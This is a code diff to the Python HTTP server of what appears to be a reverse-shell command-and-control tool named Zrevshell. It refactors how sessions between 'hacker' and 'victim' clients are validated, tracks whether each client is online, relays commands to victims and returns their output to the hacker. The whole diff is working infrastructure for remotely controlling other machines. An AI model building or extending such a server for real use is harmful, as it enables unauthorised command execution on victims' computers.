@@ -202,24 +202,67 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         return decoded_data
 
-    def validate_session(self, client_id: str, requested_session: str):
+    def get_client_status(self, client_id: str):
+        """Retrieve the current client status from the database"""
+        result = self.database.query(
+            "SELECT status FROM clients WHERE client_id=?", (client_id,)
+        )
+        # if an error happened our response will be None
+        if result is None or len(result) == 0:
+            return None
+        return result[0]
+
+    def validate_session(
+        self, client_id: str, client_type: int, requested_session: str
+    ):
         """Validate the requested session with the session_id the client is actually in.
         Returns a boolean a success and failure. It will return None if the session is dead.
         """
+        # * We will re configure how this method responds with data
+        # * it should accept the client_type of the victim
 
         # Very simple we'll check one condition that's
         # if the requested_session_id and the real_session_id match
-
         real_session_id = self.hacking_sessions.get_session_id(client_id)
 
-        if real_session_id != requested_session:
-            return False
+        # This includes all cases this works even if the client requesting
+        # is not in a session. Because when it isn't the real_session_id becomes
+        # None and therefore will not match to requested_session
+        if real_session_id != requested_session or real_session_id is None:
+            return sh.HandlerResponse(False, HTTPStatus.NOT_ACCEPTABLE)
 
         # We also need to check if the session requested is not a dead session
+        # in other words if the hacker didn't exit the session.
         if not self.hacking_sessions.check_session_alive(requested_session):
-            return None
+            if client_type == ut.ClientType.hacker:
+                return sh.HandlerResponse(False, HTTPStatus.NOT_ACCEPTABLE)
+            elif client_type == ut.ClientType.victim:
+                return sh.HandlerResponse(False, HTTPStatus.GONE)
 
-        return True
+        # Now if the session is alive and return responses for that
+        # we'll use the session_id, real_session_id, to fetch the session
+        # and check the status of the other client in that session
+        real_session = self.hacking_sessions.get_session(real_session_id)
+
+        dict_key = "victim_id"
+        if client_type == ut.ClientType.hacker:
+            dict_key = "hacker_id"
+
+        spouse_client_id = real_session[dict_key]
+        if spouse_client_id is None:
+            # We don't know what to do, the client has become
+            # None without the session being dead so let's raise
+            # an error
+            raise Exception(
+                f"Unexpected 'None' value from a client in an alive session: {real_session_id}"
+            )
+        # Check the status of the client
+        if self.get_client_status(spouse_client_id) == 0:
+            # The client has become offline so we need to inform
+            # the other user by the GONE error
+            return sh.HandlerResponse(False, HTTPStatus.GONE)
+
+        return sh.HandlerResponse(True, HTTPStatus.OK)
 
     # ---------- Server command handler methods ---------- #
 
@@ -278,12 +321,18 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
 
         # Now validate the session
-        is_valid_session = self.validate_session(client_id, session_id)
-        if not is_valid_session:
-            return sh.HandlerResponse(False, HTTPStatus.NOT_ACCEPTABLE)
+        response = self.validate_session(client_id, client_type, session_id)
+        if not response.successful:
+            return response
 
         # If it is a valid session now let's kill the session
         self.hacking_sessions.kill_session(session_id)
+
+        # And then remove the hacker from the client_list
+        # and also change the hacker_id value in the session
+        # to None.
+        self.hacking_sessions._client_list.remove(client_id)
+        self.hacking_sessions._sessions[session_id]["hacker_id"] = None
 
         # Respond to the client with an OK
         return sh.HandlerResponse(True, HTTPStatus.OK)
@@ -305,7 +354,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
                 return sh.HandlerResponse(False, HTTPStatus.CONFLICT)
         # If our user is valid then we can maybe add him to the database
         client_insert_op = self.database.execute(
-            "INSERT INTO clients VALUES(?, ?, 0.0, 1)", [client_id, client_type]
+            "INSERT INTO clients VALUES(?, ?, 0.0, 0)", [client_id, client_type]
         )
         if client_insert_op is None:
             # Some kinda SQL error happened so let's send a internal server error message
@@ -351,14 +400,14 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
 
         # Session validation
-        is_valid_session = self.validate_session(client_id, session_id)
-        if is_valid_session is None:
+        response = self.validate_session(client_id, client_type, session_id)
+        if response.res_code == HTTPStatus.GONE:
             # That means the session is dead and we need to notify the victim
             # that it is. .i.e send the termination response code and also remove the session.
             self.hacking_sessions.remove_session(session_id)
-            return sh.HandlerResponse(False, HTTPStatus.GONE)
-        if not is_valid_session:
-            return sh.HandlerResponse(False, HTTPStatus.NOT_ACCEPTABLE)
+
+        if not response.successful:
+            return response
 
         # Ok now we're sure we have an active session let's now
         # send the victim the commands, but if the command is None
@@ -389,9 +438,9 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
 
         # Session validation
-        is_valid_session = self.validate_session(client_id, requested_session_id)
-        if not is_valid_session:
-            return sh.HandlerResponse(False, HTTPStatus.NOT_ACCEPTABLE)
+        response = self.validate_session(client_id, client_type, requested_session_id)
+        if not response.successful:
+            return response
 
         # If all's good let's fetch the response and send it to the hacker
         # with a beautiful OK response code.
@@ -425,7 +474,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
 
         session_id = data.get("session_id", None)
-        response = data.get("response", None)
+        client_response = data.get("response", None)
         is_empty = data.get("empty", None)
         command_status_code = data.get(
             "command_status_code", False
@@ -434,27 +483,29 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         # Check if the necessary keys are not present in the dictionary sent
         if (
             session_id is None
-            or response is None
+            or client_response is None
             or command_status_code is False
             or is_empty is None
         ):
             return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
 
         # Session validation
-        is_valid_session = self.validate_session(client_id, session_id)
-        if is_valid_session is None:
+        validate_session_response = self.validate_session(
+            client_id, client_type, session_id
+        )
+        if validate_session_response.res_code == HTTPStatus.GONE:
             # That means the session is dead and we need to notify the victim
-            # that it is. .i.e send the termination response code and remove the session
+            # that it is. .i.e send the termination response code and also remove the session.
             self.hacking_sessions.remove_session(session_id)
-            return sh.HandlerResponse(False, HTTPStatus.GONE)
-        if not is_valid_session:
-            return sh.HandlerResponse(False, HTTPStatus.NOT_ACCEPTABLE)
+
+        if not validate_session_response.successful:
+            return validate_session_response
 
         if not is_empty:
             if command_status_code is not None:
-                response = command_status_code
+                client_response = command_status_code
             # Ok else, let's send the success code and insert the response in the session
-            self.hacking_sessions.insert_response(session_id, response)
+            self.hacking_sessions.insert_response(session_id, client_response)
 
         return sh.HandlerResponse(True, HTTPStatus.OK)
 
@@ -485,8 +536,8 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             return bad_request
 
         # Session validation
-        is_valid_session = self.validate_session(client_id, session_id)
-        if not is_valid_session:
+        response = self.validate_session(client_id, client_type, session_id)
+        if not response.successful:
             return sh.HandlerResponse(False, HTTPStatus.NOT_ACCEPTABLE)
 
         if not empty:
@@ -518,7 +569,11 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         if not valid_victim:
             return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
 
-        if self.hacking_sessions.check_client_in_session(victim_id):
+        # Check if the hacker himself is even in another session
+        # so he is trying to create multiple sessions with multiple victims
+        if self.hacking_sessions.check_client_in_session(
+            victim_id
+        ) or self.hacking_sessions.check_client_in_session(client_id):
             # This means the victim is already in session with another hacker
             # so let's notify the hacker about it by sending a forbidden error
             return sh.HandlerResponse(False, HTTPStatus.FORBIDDEN)
@@ -596,13 +651,12 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             self.c_send_error(HTTPStatus.UNAUTHORIZED)
             return
 
-        print(f"command: {command} executed")
         if command != "register":
             # Update the status and last checked time of
             # the client.
 
             rt = self.database.execute(
-                "UPDATE clients SET last_requested=? WHERE client_id=?",
+                "UPDATE clients SET last_requested=?, status=1 WHERE client_id=?",
                 (tm.time(), client_id),
             )
             if rt is None:
@@ -731,19 +785,8 @@ def check_pulse(database: sh.Database, interval: int, stop_event: th.Event):
             if (abs(tm.time() - last_requested) > interval) and status == 1:
                 # Ok this means the client got himself in a timeout error
                 # so let's set the status to 0
-                print(f"Updating pulse...{client_id} to 0")
                 database.execute(
                     "UPDATE clients SET status=0 WHERE client_id=?",
-                    (client_id,),
-                    raise_for_error=True,
-                )
-
-            elif (abs(tm.time() - last_requested) < interval) and status == 0:
-                # Ok this means the client got himself in a timeout error
-                # so let's set the status to 0
-                print(f"Updating pulse...{client_id} to 1")
-                database.execute(
-                    "UPDATE clients SET status=1 WHERE client_id=?",
                     (client_id,),
                     raise_for_error=True,
                 )
